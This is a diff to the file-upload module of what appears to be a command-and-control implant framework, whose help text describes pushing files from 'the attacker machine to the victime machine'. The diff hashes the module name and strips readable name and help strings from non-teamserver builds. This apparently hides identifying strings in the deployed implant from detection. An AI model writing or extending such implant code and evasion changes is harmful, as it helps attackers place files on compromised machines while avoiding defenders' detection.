@@ -2,10 +2,14 @@
 
 #include <cstring>
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 
-const std::string moduleName = "upload";
+constexpr std::string_view moduleName = "upload";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -18,7 +22,11 @@ __declspec(dllexport) Upload* UploadConstructor()
 #endif
 
 Upload::Upload()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -29,11 +37,12 @@ Upload::~Upload()
 std::string Upload::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "upload:\n";
 	info += "Upload a file from the attacker machine to the victime machine\n";
 	info += "exemple:\n";
 	info += "- upload c:\\temp\\toto.exe c:\\temp\\toto.exe\n";
-
+#endif
 	return info;
 }
 
@@ -74,7 +83,7 @@ int Upload::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 int Upload::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
 	std::string outputFile = c2Message.outputfile();
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd("");
 
 	std::ofstream output(outputFile, std::ios::binary);
